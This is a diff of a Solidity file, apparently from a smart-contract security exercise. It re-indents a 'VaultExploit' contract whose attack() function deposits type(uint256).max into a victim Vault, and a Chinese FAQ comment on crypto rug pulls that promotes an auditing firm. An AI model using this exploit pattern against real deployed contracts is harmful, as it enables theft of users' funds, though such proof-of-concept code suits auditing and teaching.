@@ -1,3 +1,4 @@
+// forge-lint: disable-start
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -68,35 +69,35 @@ contract Vault is IVault {
     }
 }
 
-contract VaultExploit {
-    Vault private victimInstance;
+    contract VaultExploit {
+        Vault private victimInstance;
 
-    constructor(address _victim) {
-        victimInstance = Vault(_victim);
+        constructor(address _victim) {
+            victimInstance = Vault(_victim);
+        }
+
+        function attack() external payable {
+            victimInstance.deposit(type(uint256).max);
+        }
+
+        receive() external payable { }
     }
 
-    function attack() external payable {
-        victimInstance.deposit(type(uint256).max);
-    }
+    /*
 
-    receive() external payable { }
-}
+    Q:加密货币中的地毯拉力是什么？
+    A:在加密货币市场中， “拉动”一词是指加密项目所有者在窃取投资者资金后放弃该项目的恶意行为。
 
-/*
+    Q:加密地毯拉动的常见迹象有哪些？
+    A:表明项目是“地毯式拉动”的危险信号包括：该项目一夜之间出现、流动性低、开发商匿名以及没有审计。
 
-Q:加密货币中的地毯拉力是什么？
-A:在加密货币市场中， “拉动”一词是指加密项目所有者在窃取投资者资金后放弃该项目的恶意行为。
+    Q:加密地毯拉动和 DeFi 黑客有什么区别？
+    A:加密货币黑客攻击是由外部参与者利用代币代码窃取其部分流动性而进行的，而 DeFi Rug Pull 则是由项目所有者自己进行的。
 
-Q:加密地毯拉动的常见迹象有哪些？
-A:表明项目是“地毯式拉动”的危险信号包括：该项目一夜之间出现、流动性低、开发商匿名以及没有审计。
+    Q:是否有可能追回加密地毯拉动中损失的资金？
+    A:由于涉及犯罪者的真实身份不得而知，因此几乎不可能追回在抢劫中损失的资金。
 
-Q:加密地毯拉动和 DeFi 黑客有什么区别？
-A:加密货币黑客攻击是由外部参与者利用代币代码窃取其部分流动性而进行的，而 DeFi Rug Pull 则是由项目所有者自己进行的。
+    Q:  QuillAudits 提供什么样的尽职调查？
+    A:我们开展技术和运营尽职调查，并根据审计员标记为危险的功能分析项目的代码。
 
-Q:是否有可能追回加密地毯拉动中损失的资金？
-A:由于涉及犯罪者的真实身份不得而知，因此几乎不可能追回在抢劫中损失的资金。
-
-Q:  QuillAudits 提供什么样的尽职调查？
-A:我们开展技术和运营尽职调查，并根据审计员标记为危险的功能分析项目的代码。
-
-*/
+    */
